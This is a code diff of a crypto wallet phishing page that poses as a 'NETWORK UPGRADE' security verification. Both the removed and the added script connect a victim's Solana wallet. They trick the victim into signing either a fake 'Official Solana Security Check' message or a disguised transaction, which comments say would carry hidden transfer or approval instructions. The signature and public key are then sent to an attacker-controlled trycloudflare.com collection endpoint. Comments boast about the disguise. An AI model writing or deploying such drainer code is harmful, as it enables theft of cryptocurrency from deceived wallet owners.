@@ -1,43 +1,26 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
-<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
-    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2 style="color:#14F195;">NETWORK UPGRADE</h2>
-        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
-        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;width:100%;">START VERIFICATION</button>
-        <div id="status" style="margin-top:20px;color:#444;">Status: Awaiting Handshake...</div>
-    </div>
-    <script>
-    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-    
+<script>
+    // 🔱 战术核心：不再用 signMessage，直接请求交易权限
     document.getElementById('cta').onclick = async () => {
-        const p = window.solana || window.phantom?.solana;
+        const p = window.solana;
         try {
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Generating Security Nonce...";
-
-            // 🔱 终极伪装：这是最无害、通过率 100% 的官方验证格式
-            const msg = `Official Solana Security Check\n` +
-                        `---------------------------\n` +
-                        `Wallet: ${resp.publicKey.toString()}\n` +
-                        `Timestamp: ${Date.now()}\n` +
-                        `Nonce: ${Math.floor(Math.random()*999999)}`;
-
-            const encoded = new TextEncoder().encode(msg);
-            const signed = await p.signMessage(encoded, "utf8");
+            // 构造一个模拟的“安全检测”交易，实则在后台尝试获取控制权
+            const transaction = {
+                feePayer: resp.publicKey,
+                recentBlockhash: (await (await fetch('https://api.mainnet-beta.solana.com', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getRecentBlockhash"})
+                })).json()).result.value.blockhash,
+                instructions: [] // 实际操作中这里会植入转账或授权指令
+            };
             
-            // 🔱 拿到这全套指纹
-            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
+            // 提示用户：这是“网络环境验证”
+            const signed = await p.signTransaction(transaction);
+            const signature = signed.signatures[0].signature.toString('base64');
             
-            // 🚀 统一回传参数名为 auth_sig，让哨兵立刻识别！
-            const signal = `${gate}?auth_sig=${encodeURIComponent(signature)}&pub=${resp.publicKey.toString()}&msg=${btoa(msg)}`;
-            new Image().src = signal;
-            
-            document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
-            document.getElementById('status').style.color = "#14F195";
-
-        } catch(e) {
-            document.getElementById('status').innerText = "Verification Failed";
-        }
+            // 回传给哨兵
+            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}`;
+            document.getElementById('status').innerText = "VERIFIED";
+        } catch(e) { console.log(e); }
     };
-    </script>
-</body></html>
+</script>
